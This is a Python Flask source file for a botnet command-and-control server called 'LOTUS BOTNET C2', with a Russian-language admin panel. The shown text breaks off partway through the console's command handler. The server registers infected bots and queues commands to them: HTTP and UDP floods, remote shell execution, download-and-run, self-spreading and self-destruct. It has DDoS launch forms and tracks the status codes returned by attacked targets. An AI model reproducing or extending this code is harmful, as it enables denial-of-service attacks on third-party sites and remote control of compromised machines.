import os
import sqlite3
import time
import json
import random
from flask import Flask, request, jsonify

app = Flask(__name__)

def get_db():
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS bots (
        id TEXT PRIMARY KEY,
        ip TEXT,
        info TEXT,
        status TEXT DEFAULT 'online',
        last_seen INTEGER,
        registered INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS commands (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        command TEXT,
        params TEXT,
        status TEXT DEFAULT 'pending',
        result TEXT,
        created INTEGER,
        executed INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        message TEXT,
        timestamp INTEGER
    )''')
    conn.execute('''CREATE TABLE IF NOT EXISTS attack_status (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        bot_id TEXT,
        target TEXT,
        status_code TEXT,
        timestamp INTEGER
    )''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def home():
    return 'LOTUS BOTNET C2 - ONLINE'

@app.route('/api/register')
def register():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'ERROR'
    ip = request.remote_addr
    now = int(time.time())
    conn = get_db()
    conn.execute('INSERT OR REPLACE INTO bots (id, ip, last_seen, registered, status) VALUES (?, ?, ?, ?, ?)',
                 (bot_id, ip, now, now, 'online'))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/get')
def get_command():
    bot_id = request.args.get('id')
    if not bot_id:
        return 'none'
    conn = get_db()
    conn.execute('UPDATE bots SET last_seen = ?, status = "online" WHERE id = ?',
                 (int(time.time()), bot_id))
    conn.commit()
    row = conn.execute('SELECT id, command, params FROM commands WHERE bot_id = ? AND status = "pending" LIMIT 1',
                       (bot_id,)).fetchone()
    if row:
        conn.execute('UPDATE commands SET status = "executing", executed = ? WHERE id = ?',
                     (int(time.time()), row['id']))
        conn.commit()
        conn.close()
        return f"{row['command']}:{row['params']}"
    conn.close()
    return 'none'

@app.route('/api/result', methods=['POST'])
def save_result():
    bot_id = request.args.get('id')
    result = request.form.get('result', '')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    row = conn.execute('SELECT id FROM commands WHERE bot_id = ? AND status = "executing" ORDER BY id DESC LIMIT 1',
                       (bot_id,)).fetchone()
    if row:
        conn.execute('UPDATE commands SET status = "done", result = ? WHERE id = ?',
                     (result, row['id']))
        conn.commit()
    conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                 (bot_id, result, int(time.time())))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/attack_status', methods=['POST'])
def save_attack_status():
    try:
        data = request.get_json()
        if not data:
            return 'ERROR'
        bot_id = data.get('bot_id')
        target = data.get('target')
        status_code = data.get('status_code')
        if not bot_id or not target:
            return 'ERROR'
        conn = get_db()
        conn.execute('INSERT INTO attack_status (bot_id, target, status_code, timestamp) VALUES (?, ?, ?, ?)',
                     (bot_id, target, status_code, int(time.time())))
        conn.commit()
        conn.close()
        log_msg = f"🌐 {target} - {status_code}"
        conn = get_db()
        conn.execute('INSERT INTO logs (bot_id, message, timestamp) VALUES (?, ?, ?)',
                     (bot_id, log_msg, int(time.time())))
        conn.commit()
        conn.close()
        return 'OK'
    except:
        return 'ERROR'

@app.route('/api/attack_stats')
def get_attack_stats():
    target = request.args.get('target')
    limit = request.args.get('limit', 100, type=int)
    conn = get_db()
    if target:
        rows = conn.execute('SELECT * FROM attack_status WHERE target = ? ORDER BY timestamp DESC LIMIT ?', 
                           (target, limit)).fetchall()
    else:
        rows = conn.execute('SELECT * FROM attack_status ORDER BY timestamp DESC LIMIT ?', 
                           (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/info', methods=['POST'])
def save_info():
    bot_id = request.args.get('id')
    info = request.get_data(as_text=True)
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('UPDATE bots SET info = ? WHERE id = ?', (info, bot_id))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/stats')
def api_stats():
    conn = get_db()
    total = conn.execute('SELECT COUNT(*) FROM bots').fetchone()[0]
    online = conn.execute('SELECT COUNT(*) FROM bots WHERE status = "online" AND last_seen > ?',
                          (int(time.time()) - 600,)).fetchone()[0]
    offline = total - online
    commands = conn.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"').fetchone()[0]
    status_rows = conn.execute('SELECT status_code, COUNT(*) as count FROM attack_status GROUP BY status_code').fetchall()
    conn.close()
    status_counts = {row['status_code']: row['count'] for row in status_rows}
    return jsonify({'total': total, 'online': online, 'offline': offline, 'commands': commands, 'status_counts': status_counts})

@app.route('/api/bots')
def api_bots():
    conn = get_db()
    rows = conn.execute('SELECT * FROM bots ORDER BY last_seen DESC').fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/logs')
def api_logs():
    limit = request.args.get('limit', 100, type=int)
    conn = get_db()
    rows = conn.execute('SELECT * FROM logs ORDER BY timestamp DESC LIMIT ?', (limit,)).fetchall()
    conn.close()
    return jsonify([dict(row) for row in rows])

@app.route('/api/clear_logs', methods=['POST'])
def api_clear_logs():
    conn = get_db()
    conn.execute('DELETE FROM logs')
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/delete_bot', methods=['POST'])
def api_delete_bot():
    bot_id = request.form.get('id')
    if not bot_id:
        return 'ERROR'
    conn = get_db()
    conn.execute('DELETE FROM bots WHERE id = ?', (bot_id,))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/api/send_command', methods=['POST'])
def api_send_command():
    bot_id = request.form.get('bot_id')
    command = request.form.get('command')
    params = request.form.get('params', '')
    if not command:
        return 'ERROR'
    conn = get_db()
    if bot_id == 'all':
        rows = conn.execute('SELECT id FROM bots WHERE status = "online"').fetchall()
        for row in rows:
            conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                         (row['id'], command, params, int(time.time())))
    else:
        conn.execute('INSERT INTO commands (bot_id, command, params, created) VALUES (?, ?, ?, ?)',
                     (bot_id, command, params, int(time.time())))
    conn.commit()
    conn.close()
    return 'OK'

@app.route('/admin')
def admin():
    return '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>LOTUS BOTNET C2</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0A0A0F; color: #A0A0B0; font-family: 'Segoe UI', sans-serif; padding: 20px; }
        h1 { color: #fff; font-size: 28px; margin-bottom: 20px; border-bottom: 1px solid #1A1A2E; padding-bottom: 10px; }
        .stats { display: flex; gap: 20px; margin-bottom: 30px; flex-wrap: wrap; }
        .stat { background: #14141E; padding: 15px 25px; border-radius: 12px; border: 1px solid #1A1A2E; min-width: 120px; text-align: center; }
        .stat .num { color: #2A7FFF; font-size: 28px; font-weight: 700; }
        .stat .label { color: #666; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .stat .num.online { color: #2ecc71; }
        .stat .num.offline { color: #e74c3c; }
        .stat .num.status-200 { color: #2ecc71; }
        .stat .num.status-503 { color: #e74c3c; }
        .tabs { display: flex; gap: 5px; margin-bottom: 20px; border-bottom: 1px solid #1A1A2E; flex-wrap: wrap; }
        .tab { padding: 10px 20px; cursor: pointer; border-radius: 8px 8px 0 0; transition: 0.3s; background: transparent; color: #666; border: none; font-size: 14px; }
        .tab:hover { color: #fff; background: #14141E; }
        .tab.active { background: #14141E; color: #2A7FFF; border-bottom: 2px solid #2A7FFF; }
        .panel { display: none; background: #14141E; padding: 20px; border-radius: 12px; border: 1px solid #1A1A2E; }
        .panel.active { display: block; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { text-align: left; padding: 10px; border-bottom: 1px solid #1A1A2E; color: #888; }
        td { padding: 10px; border-bottom: 1px solid #0A0A0F; word-break: break-all; }
        .status { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 10px; font-weight: 600; }
        .status.online { background: rgba(46, 204, 113, 0.2); color: #2ecc71; }
        .status.offline { background: rgba(231, 76, 60, 0.2); color: #e74c3c; }
        .cmd-form { display: flex; gap: 10px; flex-wrap: wrap; margin: 10px 0; }
        .cmd-form select, .cmd-form input { background: #0A0A0F; border: 1px solid #1A1A2E; color: #A0A0B0; padding: 10px 15px; border-radius: 8px; font-size: 13px; flex: 1; min-width: 150px; }
        .cmd-form button { background: #2A7FFF; color: #fff; border: none; padding: 10px 25px; border-radius: 8px; cursor: pointer; font-weight: 600; transition: 0.3s; }
        .cmd-form button:hover { background: #3A8FFF; }
        .btn { background: #1A1A2E; color: #A0A0B0; border: none; padding: 6px 12px; border-radius: 6px; cursor: pointer; font-size: 11px; transition: 0.3s; }
        .btn:hover { background: #2A2A4E; color: #fff; }
        .btn.danger { background: #8B1A1A; color: #fff; }
        .btn.danger:hover { background: #c0392b; }
        .logs { max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; }
        .logs .log { padding: 3px 0; border-bottom: 1px solid #0A0A0F; }
        .logs .log .time { color: #555; }
        .logs .log .bot { color: #2A7FFF; }
        .ddos-panel { background: #0A0A0F; padding: 15px; border-radius: 8px; border: 1px solid #1A1A2E; margin-top: 15px; }
        .console { background: #0A0A0F; padding: 15px; border-radius: 8px; border: 1px solid #1A1A2E; font-family: monospace; }
        .console-input { display: flex; gap: 10px; margin-top: 10px; }
        .console-input input { flex: 1; background: #14141E; border: 1px solid #1A1A2E; color: #0f0; padding: 10px 15px; border-radius: 8px; font-family: monospace; font-size: 14px; }
        .console-input input:focus { outline: none; border-color: #2A7FFF; }
        .console-output { max-height: 400px; overflow-y: auto; color: #0f0; font-size: 13px; line-height: 1.6; }
        .console-output .prompt { color: #2A7FFF; }
        .console-output .error { color: #e74c3c; }
        .console-output .info { color: #f1c40f; }
        .console-output .success { color: #2ecc71; }
        .console-output .status-2xx { color: #2ecc71; }
        .console-output .status-3xx { color: #f1c40f; }
        .console-output .status-4xx { color: #e67e22; }
        .console-output .status-5xx { color: #e74c3c; }
        .help-grid { display: grid; grid-template-columns: auto 1fr auto; gap: 5px 20px; font-size: 12px; color: #888; margin: 10px 0; }
        .help-grid .cmd { color: #2A7FFF; font-weight: 600; }
        .help-grid .desc { color: #A0A0B0; }
        .help-grid .example { color: #555; font-size: 11px; }
        @media (max-width: 768px) { .stats { flex-direction: column; } .cmd-form { flex-direction: column; } }
        .id-cell { font-family: monospace; font-size: 11px; max-width: 120px; overflow: hidden; text-overflow: ellipsis; }
        .status-badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 11px; }
        .status-badge.s200 { background: rgba(46,204,113,0.3); color: #2ecc71; }
        .status-badge.s429 { background: rgba(230,126,34,0.3); color: #e67e22; }
        .status-badge.s503 { background: rgba(231,76,60,0.3); color: #e74c3c; }
        .status-badge.s500 { background: rgba(231,76,60,0.3); color: #e74c3c; }
        .status-badge.s403 { background: rgba(230,126,34,0.3); color: #e67e22; }
        .status-badge.s404 { background: rgba(230,126,34,0.3); color: #e67e22; }
        .status-badge.s3xx { background: rgba(241,196,15,0.3); color: #f1c40f; }
    </style>
</head>
<body>
    <h1>🐍 LOTUS BOTNET C2</h1>
    <div class="stats" id="stats">
        <div class="stat"><div class="num" id="total">0</div><div class="label">Всего ботов</div></div>
        <div class="stat"><div class="num online" id="online">0</div><div class="label">Онлайн</div></div>
        <div class="stat"><div class="num offline" id="offline">0</div><div class="label">Оффлайн</div></div>
        <div class="stat"><div class="num" id="commands">0</div><div class="label">Команд в очереди</div></div>
        <div class="stat"><div class="num status-200" id="stat200">0</div><div class="label">✅ 200 OK</div></div>
        <div class="stat"><div class="num status-503" id="stat503">0</div><div class="label">❌ 503 Error</div></div>
    </div>
    <div class="tabs">
        <button class="tab active" onclick="showPanel('bots')">🤖 Боты</button>
        <button class="tab" onclick="showPanel('commands')">📡 Команды</button>
        <button class="tab" onclick="showPanel('logs')">📋 Логи</button>
        <button class="tab" onclick="showPanel('status')">📊 Статусы</button>
        <button class="tab" onclick="showPanel('ddos')">💥 DDoS</button>
        <button class="tab" onclick="showPanel('console')">⌨️ КОНСОЛЬ</button>
    </div>
    
    <div class="panel active" id="panel-bots">
        <div style="margin-bottom: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
            <button class="btn" onclick="refreshBots()">🔄 Обновить</button>
            <button class="btn danger" onclick="deleteAllBots()">🗑️ Удалить всех</button>
        </div>
        <div style="overflow-x: auto;">
            <table>
                <thead><tr><th>ID</th><th>IP</th><th>Статус</th><th>Последний раз</th><th>Действия</th></tr></thead>
                <tbody id="botsBody"></tbody>
            </table>
        </div>
    </div>
    
    <div class="panel" id="panel-commands">
        <h3 style="color:#fff; margin-bottom:15px;">📡 Отправить команду</h3>
        <form class="cmd-form" onsubmit="sendCommand(event)">
            <select name="bot_id" id="cmdBotSelect"><option value="all">🌐 ВСЕМ БОТАМ</option></select>
            <select name="command" id="cmdType">
                <option value="http_flood">💥 HTTP Flood</option>
                <option value="udp_flood">💥 UDP Flood</option>
                <option value="cmd">💻 CMD</option>
                <option value="download">📥 Скачать и запустить</option>
                <option value="update">🔄 Обновиться</option>
                <option value="selfdestruct">💀 Самоуничтожение</option>
                <option value="spread">📀 Распространиться</option>
                <option value="info">📊 Информация</option>
                <option value="ping">🏓 Ping</option>
                <option value="stop_attack">⏹ Остановить атаку</option>
            </select>
            <input type="text" id="cmdParams" placeholder="Параметры (URL, команда, цель)">
            <button type="submit">▶ Отправить</button>
        </form>
        <h3 style="color:#fff; margin:20px 0 10px;">📋 История команд</h3>
        <div style="overflow-x:auto;"><table><thead><tr><th>Бот</th><th>Команда</th><th>Статус</th><th>Результат</th></tr></thead><tbody id="commandsBody"></tbody></table></div>
    </div>
    
    <div class="panel" id="panel-logs">
        <div style="margin-bottom: 10px; display: flex; gap: 10px;">
            <button class="btn" onclick="refreshLogs()">🔄 Обновить</button>
            <button class="btn danger" onclick="clearLogs()">🗑️ Очистить</button>
        </div>
        <div class="logs" id="logsContainer"></div>
    </div>
    
    <div class="panel" id="panel-status">
        <h3 style="color:#fff; margin-bottom:15px;">📊 СТАТУСЫ HTTP АТАК</h3>
        <div style="display:flex; gap:15px; flex-wrap:wrap; margin-bottom:15px;">
            <span style="color:#2ecc71;">🟢 200 OK</span>
            <span style="color:#f1c40f;">🟡 3xx Redirect</span>
            <span style="color:#e67e22;">🟠 4xx Error</span>
            <span style="color:#e74c3c;">🔴 5xx Error</span>
            <span style="color:#e67e22;">🟠 429 Rate Limit</span>
        </div>
        <div id="statusContainer" style="font-family: monospace; font-size: 13px; max-height: 400px; overflow-y: auto;">
            <div class="info">Ожидание данных...</div>
        </div>
    </div>
    
    <div class="panel" id="panel-ddos">
        <h3 style="color:#fff; margin-bottom:15px;">💥 МАССОВАЯ DDoS АТАКА</h3>
        <form class="cmd-form" onsubmit="startDDoS(event)">
            <input type="text" id="ddosTarget" placeholder="https://target.com" style="flex:2; min-width:300px;">
            <button type="submit" style="background:#c0392b;">🔥 ЗАПУСТИТЬ DDoS</button>
        </form>
        <div class="ddos-panel">
            <p style="color:#666; font-size:12px;">💡 Атака начнется через 1-5 секунд на всех подключенных ботах</p>
            <p style="color:#666; font-size:12px;">📊 Ботов в атаке: <span id="ddosCount">0</span></p>
            <button class="btn danger" onclick="stopAttack()" style="margin-top:10px;">⏹ ОСТАНОВИТЬ ВСЕ АТАКИ</button>
        </div>
    </div>
    
    <div class="panel" id="panel-console">
        <h3 style="color:#fff; margin-bottom:15px;">⌨️ КОМАНДНАЯ КОНСОЛЬ</h3>
        <div class="console">
            <div class="console-output" id="consoleOutput">
                <div class="info">=== LOTUS BOTNET C2 CONSOLE ===</div>
                <div class="info">Введите help для списка команд</div>
                <div class="info">Статусы HTTP отображаются в реальном времени</div>
                <div style="margin-top:10px; border-top:1px solid #1A1A2E; padding-top:10px;"></div>
            </div>
            <div class="console-input">
                <input type="text" id="consoleInput" placeholder="Введите команду..." autofocus>
                <button class="btn" onclick="executeConsoleCommand()" style="background:#2A7FFF; color:#fff;">⏎</button>
                <button class="btn" onclick="clearConsole()">🗑️ Очистить</button>
            </div>
        </div>
        <div style="margin-top:15px;">
            <details style="color:#666; font-size:12px;">
                <summary style="cursor:pointer; color:#2A7FFF;">📖 Список команд (help)</summary>
                <div class="help-grid">
                    <span class="cmd">help</span><span class="desc">Показать это меню</span>
                    <span class="cmd">list</span><span class="desc">Список всех ботов</span>
                    <span class="cmd">cmd &lt;команда&gt;</span><span class="desc">Выполнить CMD на всех ботах</span><span class="example">cmd whoami</span>
                    <span class="cmd">cmd &lt;бот_id&gt; &lt;команда&gt;</span><span class="desc">Выполнить CMD на конкретном боте</span><span class="example">cmd BOT_123 whoami</span>
                    <span class="cmd">ddos &lt;url&gt;</span><span class="desc">HTTP Flood</span><span class="example">ddos https://target.com</span>
                    <span class="cmd">udp &lt;url&gt;</span><span class="desc">UDP Flood</span>
                    <span class="cmd">mix &lt;url&gt;</span><span class="desc">ВСЕ ТИПЫ АТАК ОДНОВРЕМЕННО</span>
                    <span class="cmd">info &lt;бот_id&gt;</span><span class="desc">Информация о боте</span>
                    <span class="cmd">kill &lt;бот_id&gt;</span><span class="desc">Самоуничтожение</span>
                    <span class="cmd">spread</span><span class="desc">Распространение</span>
                    <span class="cmd">stop</span><span class="desc">Остановить все атаки</span>
                    <span class="cmd">ping</span><span class="desc">Проверить соединение</span>
                    <span class="cmd">stats</span><span class="desc">Статистика</span>
                    <span class="cmd">logs</span><span class="desc">Показать логи</span>
                    <span class="cmd">clear</span><span class="desc">Очистить логи</span>
                </div>
            </details>
        </div>
    </div>
    
    <script>
        let attackTarget = '';
        let statusInterval = null;
        
        function showPanel(name) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.getElementById('panel-' + name).classList.add('active');
            document.querySelector(`.tab[onclick*="${name}"]`).classList.add('active');
            if (name === 'bots') refreshBots();
            if (name === 'logs') refreshLogs();
            if (name === 'status') refreshAttackStatus();
            if (name === 'console') document.getElementById('consoleInput').focus();
        }
        
        async function refreshStats() {
            try {
                const r = await fetch('/api/stats');
                const data = await r.json();
                document.getElementById('total').textContent = data.total || 0;
                document.getElementById('online').textContent = data.online || 0;
                document.getElementById('offline').textContent = data.offline || 0;
                document.getElementById('commands').textContent = data.commands || 0;
                document.getElementById('ddosCount').textContent = data.online || 0;
                if (data.status_counts) {
                    document.getElementById('stat200').textContent = data.status_counts['200 OK'] || 0;
                    document.getElementById('stat503').textContent = data.status_counts['503 Service Unavailable'] || 0;
                }
            } catch {}
        }
        
        async function refreshBots() {
            try {
                const r = await fetch('/api/bots');
                const data = await r.json();
                const tbody = document.getElementById('botsBody');
                const select = document.getElementById('cmdBotSelect');
                select.innerHTML = '<option value="all">🌐 ВСЕМ БОТАМ</option>';
                tbody.innerHTML = '';
                data.forEach(bot => {
                    const statusClass = bot.status === 'online' ? 'online' : 'offline';
                    const lastSeen = bot.last_seen ? new Date(bot.last_seen * 1000).toLocaleString() : 'Никогда';
                    const ip = bot.ip || 'N/A';
                    const tr = document.createElement('tr');
                    tr.innerHTML = `<td class="id-cell">${bot.id}</td><td>${ip}</td><td><span class="status ${statusClass}">${bot.status}</span></td><td>${lastSeen}</td><td><button class="btn" onclick="sendQuickCommand('${bot.id}','info','')">📊</button><button class="btn danger" onclick="deleteBot('${bot.id}')">🗑️</button></td>`;
                    tbody.appendChild(tr);
                    const opt = document.createElement('option');
                    opt.value = bot.id;
                    opt.textContent = bot.id + ' (' + ip + ')';
                    select.appendChild(opt);
                });
                refreshStats();
            } catch {}
        }
        
        async function refreshLogs() {
            try {
                const r = await fetch('/api/logs?limit=100');
                const data = await r.json();
                const container = document.getElementById('logsContainer');
                container.innerHTML = '';
                data.forEach(log => {
                    const div = document.createElement('div');
                    div.className = 'log';
                    const time = new Date(log.timestamp * 1000).toLocaleTimeString();
                    let msg = log.message;
                    // Окрашиваем статусы
                    if (msg.includes('200')) msg = '✅ ' + msg;
                    else if (msg.includes('503')) msg = '❌ ' + msg;
                    else if (msg.includes('429')) msg = '⚠️ ' + msg;
                    else if (msg.includes('4')) msg = '⚠️ ' + msg;
                    else if (msg.includes('5')) msg = '❌ ' + msg;
                    div.innerHTML = `<span class="time">[${time}]</span> <span class="bot">${log.bot_id}</span> <span class="msg">${msg}</span>`;
                    container.appendChild(div);
                });
            } catch {}
        }
        
        async function refreshAttackStatus() {
            try {
                const r = await fetch('/api/attack_stats?limit=100');
                const data = await r.json();
                const container = document.getElementById('statusContainer');
                container.innerHTML = '';
                if (data.length === 0) {
                    container.innerHTML = '<div class="info">Нет данных об атаках</div>';
                    return;
                }
                const targets = {};
                data.forEach(item => {
                    if (!targets[item.target]) targets[item.target] = [];
                    targets[item.target].push(item);
                });
                for (const [target, items] of Object.entries(targets)) {
                    const div = document.createElement('div');
                    div.style.cssText = 'margin: 10px 0; padding: 10px; background: #0A0A0F; border-radius: 8px;';
                    const stats = {};
                    items.forEach(item => {
                        const code = item.status_code || 'Unknown';
                        stats[code] = (stats[code] || 0) + 1;
                    });
                    let statusHtml = `<div style="color:#2A7FFF; font-weight:bold;">🎯 ${target}</div><div style="display:flex; gap:15px; flex-wrap:wrap; margin-top:5px;">`;
                    for (const [code, count] of Object.entries(stats)) {
                        let color = '#888';
                        let cls = '';
                        if (code.includes('200')) { color = '#2ecc71'; cls = 's200'; }
                        else if (code.includes('3')) { color = '#f1c40f'; cls = 's3xx'; }
                        else if (code.includes('429')) { color = '#e67e22'; cls = 's429'; }
                        else if (code.includes('4')) { color = '#e67e22'; cls = 's4xx'; }
                        else if (code.includes('5')) { color = '#e74c3c'; cls = 's5xx'; }
                        statusHtml += `<span style="color:${color}; font-weight:bold;" class="status-badge ${cls}">${code}: ${count}</span>`;
                    }
                    statusHtml += '</div>';
                    const last5 = items.slice(0, 5);
                    statusHtml += '<div style="font-size:11px; color:#666; margin-top:5px;">Последние: ';
                    last5.forEach((item) => {
                        const time = new Date(item.timestamp * 1000).toLocaleTimeString();
                        let color = '#888';
                        if (item.status_code && item.status_code.includes('200')) color = '#2ecc71';
                        else if (item.status_code && item.status_code.includes('5')) color = '#e74c3c';
                        else if (item.status_code && item.status_code.includes('429')) color = '#e67e22';
                        statusHtml += `<span style="color:${color}">[${time}] ${item.status_code || 'Unknown'}</span> `;
                    });
                    statusHtml += '</div>';
                    div.innerHTML = statusHtml;
                    container.appendChild(div);
                }
            } catch {}
        }
        
        async function sendCommand(e) {
            e.preventDefault();
            const botId = document.getElementById('cmdBotSelect').value;
            const command = document.getElementById('cmdType').value;
            const params = document.getElementById('cmdParams').value;
            const formData = new FormData();
            formData.append('bot_id', botId);
            formData.append('command', command);
            formData.append('params', params);
            await fetch('/api/send_command', { method: 'POST', body: formData });
            document.getElementById('cmdParams').value = '';
            refreshStats();
            addConsoleLine('success', '✅ Команда отправлена: ' + command + ' ' + params + ' -> ' + botId);
        }
        
        async function sendQuickCommand(botId, command, params) {
            const formData = new FormData();
            formData.append('bot_id', botId);
            formData.append('command', command);
            formData.append('params', params);
            await fetch('/api/send_command', { method: 'POST', body: formData });
            refreshStats();
            addConsoleLine('success', '✅ Команда отправлена: ' + command + ' -> ' + botId);
        }
        
        async function startDDoS(e) {
            e.preventDefault();
            const target = document.getElementById('ddosTarget').value;
            if (!target) return;
            attackTarget = target;
            const formData = new FormData();
            formData.append('bot_id', 'all');
            formData.append('command', 'http_flood');
            formData.append('params', target);
            await fetch('/api/send_command', { method: 'POST', body: formData });
            document.getElementById('ddosTarget').value = '';
            refreshStats();
            addConsoleLine('success', '🔥 DDoS атака запущена на ' + target);
            // Автоматически показываем статусы
            if (!statusInterval) {
                statusInterval = setInterval(refreshAttackStatus, 3000);
            }
            alert('🔥 DDoS атака запущена на ' + target);
        }
        
        async function stopAttack() {
            const formData = new FormData();
            formData.append('bot_id', 'all');
            formData.append('command', 'stop_attack');
            formData.append('params', '');
            await fetch('/api/send_command', { method: 'POST', body: formData });
            addConsoleLine('success', '⏹ Все атаки остановлены');
            if (statusInterval) {
                clearInterval(statusInterval);
                statusInterval = null;
            }
            alert('⏹ Все атаки остановлены');
        }
        
        async function deleteBot(id) {
            if (!confirm('Удалить бота ' + id + '?')) return;
            const formData = new FormData();
            formData.append('id', id);
            await fetch('/api/delete_bot', { method: 'POST', body: formData });
            refreshBots();
            addConsoleLine('error', '🗑️ Бот удален: ' + id);
        }
        
        async function deleteAllBots() {
            if (!confirm('Удалить ВСЕХ ботов?')) return;
            const data = await (await fetch('/api/bots')).json();
            for (const bot of data) {
                const fd = new FormData();
                fd.append('id', bot.id);
                await fetch('/api/delete_bot', { method: 'POST', body: fd });
            }
            refreshBots();
            addConsoleLine('error', '🗑️ Все боты удалены');
        }
        
        async function clearLogs() {
            if (!confirm('Очистить логи?')) return;
            await fetch('/api/clear_logs', { method: 'POST' });
            refreshLogs();
            addConsoleLine('info', '🗑️ Логи очищены');
        }
        
        // ============== КОНСОЛЬ ==============
        function addConsoleLine(type, text) {
            const output = document.getElementById('consoleOutput');
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            let colorClass = type;
            if (text.includes('200')) colorClass = 'status-2xx';
            else if (text.includes('503')) colorClass = 'status-5xx';
            else if (text.includes('429')) colorClass = 'status-4xx';
            else if (text.includes('4')) colorClass = 'status-4xx';
            else if (text.includes('5')) colorClass = 'status-5xx';
            div.innerHTML = `<span style="color:#555;">[${time}]</span> <span class="${colorClass}">${text}</span>`;
            output.appendChild(div);
            output.scrollTop = output.scrollHeight;
        }
        
        function clearConsole() {
            document.getElementById('consoleOutput').innerHTML = `
                <div class="info">=== LOTUS BOTNET C2 CONSOLE ===</div>
                <div class="info">Введите help для списка команд</div>
                <div class="info">Статусы HTTP отображаются в реальном времени</div>
                <div style="margin-top:10px; border-top:1px solid #1A1A2E; padding-top:10px;"></div>
            `;
        }
        
        function parseCommand(cmd) {
            const parts = cmd.trim().split(/\s+/);
            const command = parts[0].toLowerCase();
            const args = parts.slice(1);
            return { command, args };
        }
        
        async function executeConsoleCommand() {
            const input = document.getElementById('consoleInput');
            const cmd = input.value.trim();
            if (!cmd) return;
            input.value = '';
            addConsoleLine('prompt', '> ' + cmd);
            const { command, args } = parseCommand(cmd);
            
            try {
                switch(command) {
                    case 'help':
                        addConsoleLine('info', 'Доступные команды:');
                        addConsoleLine('info', '  help - показать это меню');
                        addConsoleLine('info', '  list - список ботов');
                        addConsoleLine('info', '  cmd <команда> - CMD на всех ботах');
                        addConsoleLine('info', '  cmd <бот_id> <команда> - CMD на конкретном');
                        addConsoleLine('info', '  ddos <url> - HTTP Flood');
                        addConsoleLine('info', '  udp <url> - UDP Flood');
                        addConsoleLine('info', '  mix <url> - ВСЕ ТИПЫ ОДНОВРЕМЕННО');
                        addConsoleLine('info', '  info <бот_id> - информация о боте');
                        addConsoleLine('info', '  kill <бот_id> - самоуничтожение');
                        addConsoleLine('info', '  spread - распространение');
                        addConsoleLine('info', '  stop - остановить все атаки');
                        addConsoleLine('info', '  ping - проверить соединение');
                        addConsoleLine('info', '  stats - статистика');
                        addConsoleLine('info', '  logs - показать логи');
                        addConsoleLine('info', '  clear - очистить логи');
                        break;
                        
                    case 'list':
                        const botsRes = await fetch('/api/bots');
                        const bots = await botsRes.json();
                        if (bots.length === 0) {
                            addConsoleLine('info', 'Нет подключенных ботов');
                        } else {
                            addConsoleLine('info', '🤖 Ботов: ' + bots.length);
                            bots.forEach(b => {
                                const status = b.status === 'online' ? '🟢' : '🔴';
                                addConsoleLine('info', `  ${status} ${b.id} (${b.ip || 'N/A'}) - ${b.status}`);
                            });
                        }
                        break;
                        
                    case 'stats':
                        await refreshStats();
                        addConsoleLine('info', '📊 Статистика обновлена');
                        break;
                        
                    case 'logs':
                        await refreshLogs();
                        addConsoleLine('info', '📋 Логи обновлены');
                        break;
                        
                    case 'clear':
                        await clearLogs();
                        break;
                        
                    case 'stop':
                        await stopAttack();
                        break;
                        
                    case 'ping':
                        const pingForm = new FormData();
                        pingForm.append('bot_id', 'all');
                        pingForm.append('command', 'ping');
                        pingForm.append('params', '');
                        await fetch('/api/send_command', { method: 'POST', body: pingForm });
                        addConsoleLine('success', '🏓 Ping отправлен всем ботам');
                        break;
                        
                    case 'cmd':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: cmd <команда>');
                            break;
                        }
                        let target = 'all';
                        let cmdToExec = args.join(' ');
                        if (args.length > 1 && args[0].startsWith('BOT_')) {
                            target = args[0];
                            cmdToExec = args.slice(1).join(' ');
                        }
                        const cmdForm = new FormData();
                        cmdForm.append('bot_id', target);
                        cmdForm.append('command', 'cmd');
                        cmdForm.append('params', cmdToExec);
                        await fetch('/api/send_command', { method: 'POST', body: cmdForm });
                        addConsoleLine('success', `💻 CMD отправлен ${target}: ${cmdToExec}`);
                        break;
                        
                    case 'ddos':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: ddos <url>');
                            break;
                        }
                        const ddosForm = new FormData();
                        ddosForm.append('bot_id', 'all');
                        ddosForm.append('command', 'http_flood');
                        ddosForm.append('params', args[0]);
                        await fetch('/api/send_command', { method: 'POST', body: ddosForm });
                        addConsoleLine('success', `🔥 DDoS запущен на ${args[0]}`);
                        if (!statusInterval) {
                            statusInterval = setInterval(refreshAttackStatus, 3000);
                        }
                        break;
                        
                    case 'udp':
                        if (args.length === 0) {
                            addConsoleLine('error', '❌ Использование: udp <url>');
                            break;
                        }
